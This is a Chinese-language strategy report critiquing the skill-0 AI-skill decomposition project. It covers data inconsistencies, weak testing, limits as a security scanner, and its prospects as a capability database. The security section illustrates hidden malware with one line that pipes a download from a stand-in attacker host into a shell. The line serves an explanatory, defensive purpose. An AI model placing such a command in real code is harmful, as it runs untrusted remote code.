# Skill-0 專案戰略分析報告

> 分析日期：2026-03-13
> 分析範圍：專案批評、安全檢測可行性、AI 能力資料庫可行性

---

## 一、專案全面批評

### 核心概念層面

#### 問題 1：價值主張模糊（最嚴重）

整個專案建立在「用 Actions/Rules/Directives 三元分類來拆解 AI Skill」這個核心概念上，但從未回答最關鍵的問題：**然後呢？**

- 32 個已解析的技能，分解出 266 個 Action、84 個 Rule、120 個 Directive
- 這些數據的下游消費者在哪裡？沒有應用端使用這些分解結果
- 向量搜索找到「相似的 Skill」，然後用來做什麼？文件從未說清楚
- **這是一個尋找問題的解決方案（solution looking for a problem）**

#### 問題 2：三元分類的邊界不清晰

- `execution_paths` 欄位在 schema v2.4 中定義，但 **32 個解析好的 skill 一個都沒有用到** — 這個核心功能是死的
- 分類標準主觀性強，無法自動化驗證，每次靠人工判斷
- 部分 Action 的 description 暗含驗證邏輯，違反自身規範

---

### 工程品質層面

#### 問題 3：為 32 個 JSON 檔案建了一個企業級系統

| 基礎設施 | 規模 | 問題 |
|---------|------|------|
| 2 個 FastAPI 服務 | 8000 + 8001 port | 為什麼需要兩個？ |
| JWT 認證 + 速率限制 | 完整實作 | 用戶群體在哪？ |
| Governance 工作流 | 1,818 行 | 誰在做 approval 流程？ |
| React 19 前端 | 完整 Dashboard | 有多少人使用？ |
| Docker Compose (dev + prod) | 3 個 Dockerfile | 部署在哪台伺服器？ |
| SQLite 向量資料庫 | 1.8MB | 32 個 skill，1.8MB |

#### 問題 4：兩個資料庫嚴重不同步

- Governance DB：163 個「已批准」skill
- Vector Store：32 個已索引 skill
- **131 個「已批准」的 skill 根本沒有被索引**，系統核心假設已經崩潰

---

### 測試層面

#### 問題 5：CI 使用 `HF_HUB_OFFLINE=1` 模式

- 核心功能（embedding 生成、向量搜索）在 CI 中完全沒有被測試
- Frontend（React 19 Dashboard）零測試
- `execution_paths` 功能沒有任何測試，因為沒有 skill 實作它

---

### 資料層面

#### 問題 6：195 個 skill 的宣稱是虛的

- 官方說「195 parsed skills」
- 實際 `parsed/` 目錄：32 個完整解析的 skill
- 其他 163 個在 `converted-skills/` — 格式不同，品質參差不齊

#### 問題 7：Schema 版本膨脹

- 2026年1月到2月，schema 從 v1.0 到 v2.4
- 舊有的 32 個 skill 並沒有補上新欄位
- 新功能沒有任何實際資料支撐

---

### 真正值得肯定的部分

1. **向量搜索架構乾淨** — `embedder.py`, `vector_store.py`, `search.py` 三層分離良好
2. **API 安全設計認真** — JWT + rate limiting + CORS 環境變數化
3. **schema/skill-decomposition.schema.json** — 設計細緻，有 ID 規範、條件類型枚舉
4. **CI/CD 管道存在** — 有 flake8, JSON 驗證, Docker build

---

### 立即行動建議

1. **回答「這個系統給誰用、為什麼用」** — 真實使用場景
2. **同步兩個資料庫** — governance.db 與 vector store 的 131 筆差異
3. **刪掉或實作 `execution_paths`** — 死功能比沒有功能更危險

---

## 二、用於網路 Skill 安全檢測的可行性

### 核心問題：技能描述 ≠ 技能實作

skill-0 分析的是 **JSON 格式的結構描述**，不是實際執行的程式碼。

```
[使用者下載的 skill]
├── skill.json          ← skill-0 能分析這個
│   └── Actions: ["read_file", "send_api"]  ← 宣稱的行為
└── skill_impl.py       ← 惡意代碼藏在這裡，skill-0 完全看不到
    └── os.system("curl evil.com | bash")
```

惡意行為者只需寫一個看起來無害的 JSON，底層實作完全不受約束。

### 三種威脅模型的可行性

| 威脅類型 | 可行性 | 原因 |
|---------|-------|------|
| 惡意程序 / 後門 | ❌ 不足 | 惡意者輕易偽造良性描述 |
| 病毒檢測 | ❌ 不可行 | 需要位元組分析、沙箱、簽名 DB |
| 功能不完備 | ✅ 可行 | Schema 驗證、ID 一致性、矛盾檢查 |

### 可以有效檢測的問題（功能不完備）

```
✅ Schema 驗證失敗（缺少必要欄位）
✅ execution_paths 引用不存在的 Action ID
✅ Action 宣稱 deterministic 但 type 是 llm_inference（矛盾）
✅ 沒有任何 Rule 的 Skill（沒有錯誤處理）
✅ 與已知 Skill 過度相似（可能是拷貝但未更新）
```

### 真正有效的防線架構

```
第一層：skill-0 能做（結構完整性）
├── Schema 合規驗證
├── ID 引用一致性
└── 功能聲明矛盾檢查

第二層：需要新增（語義風險評估）
├── Action 組合危險度評分
│   例：io_write + external_call + state_change 同時出現 → 高風險
├── 與已知惡意模式的向量相似度
└── 作者/來源信譽評分

第三層：skill-0 無法做（執行層分析）
├── 實際程式碼靜態分析（需要 AST parser）
├── 沙箱動態執行
└── 網路行為監控
```

### 結論

**定位成「Skill Linting + Risk Scoring」，而非「Security Scanner」。**

宣稱能「檢測惡意程序和病毒」是超賣（over-claiming），會建立虛假的安全感，比沒有檢測更危險。配合 bandit / semgrep 等工具做第三層，才能構成真正有意義的防線。

---

## 三、作為個人 AI 能力資料庫的可行性

### 概念架構

```
[安裝 Skill] → 拆解 → 儲存原子元件
     ↓
[使用者需求] → 語意搜索 → 組合元件 → AI 即時執行
```

### 真正可行的部分

**1. 儲存與索引：skill-0 的現有架構已足夠**

語意相似的 Action 可以被識別為同一能力的不同實現，避免重複儲存。

**2. 需求→元件的語意檢索品質已有基礎**

`all-MiniLM-L6-v2` + SQLite-vec 對「找對應能力」的任務夠用。

**3. 避免重複能力**

同一個「傳送 HTTP 請求」的 Action 不需要從 100 個 Skill 各存一份。

### 三個根本性挑戰

#### 挑戰 1：拆解後的元件能被重新組合嗎？

```
Skill-A 的 Action:  read_file(path) → returns FileObject
Skill-B 的 Action:  parse_csv(file_path: str) → returns DataFrame
```

語意相似，但**介面不相容**。現在的 skill-0 完全不儲存介面規格（input/output schema），只儲存文字描述。AI 能理解語意，但無法保證類型相容性。

#### 挑戰 2：AI 即時組合的可靠性

```
使用者需求: "分析我的銷售數據並生成報告"

AI 組合路徑 (可能 A):  read_csv → validate → compute_stats → generate_chart → export_pdf
AI 組合路徑 (可能 B):  read_excel → transform → llm_inference → write_markdown
```

兩條路徑都語意合理，執行結果完全不同。**沒有 ground truth 驗證組合是否正確。**

#### 挑戰 3：Action 數量導致組合爆炸

500 個 Skill → 約 4,000 個 Action。從 4,000 個元件中選出 5-10 個並按正確順序排列，搜索空間是 O(n!) 的排列問題，純語意搜索不足以解決。

### 與現有技術的差距

| 目標功能 | 現有最接近技術 | 差距 |
|---------|--------------|------|
| 能力原子化儲存 | MCP Tools | MCP 已有標準化介面規格 |
| 語意搜索能力 | RAG + Tool Retrieval | 成熟，skill-0 基本可做到 |
| AI 即時組合執行 | LangGraph / AutoGen | 需要 orchestration 層 |
| 跨 Skill 元件重用 | ToolBench 研究 | 研究中，尚無成熟實作 |

### 現在缺少什麼

```
現在 skill-0 有:
  ✅ 結構化拆解格式 (Action/Rule/Directive)
  ✅ 向量儲存與語意搜索
  ✅ Schema 驗證

還需要:
  ❌ Action 的 input/output schema (類型系統)
  ❌ 組合驗證器 (確認 A 的輸出能接 B 的輸入)
  ❌ Orchestration 層 (實際執行組合好的 Action 序列)
  ❌ 執行沙箱 (Action 失敗時的回滾機制)
  ❌ 使用者回饋迴路 (哪些組合實際有效)
```

### 結論

**可行，但 skill-0 現在只完成了這個系統的約 20%。**

| 階段 | 目標 | 現實性 |
|------|------|-------|
| 短期 | 能力目錄（人類選擇，AI 填充細節） | 今天就能做 |
| 中期 | 加入 input/output schema，AI 做類型安全組合 | 3-6 個月工程量 |
| 長期 | 接入 MCP/LangGraph 作為執行層，形成完整閉環 | 研究問題尚未解決 |

這個方向**比「安全掃描」更符合 skill-0 的真實能力邊界**，是更值得投入的路線。

---

## 總體建議優先序

1. **確立一個清晰的核心用途**（能力目錄 > 安全掃描）
2. **修復資料一致性**（governance.db 與 vector store 同步）
3. **實作或移除 `execution_paths`**（死功能是最大的架構謊言）
4. **為 Action 加入介面規格**（這是通往動態組合的必要前提）
5. **接入現有 orchestration 框架**（不要自己造 LangGraph）
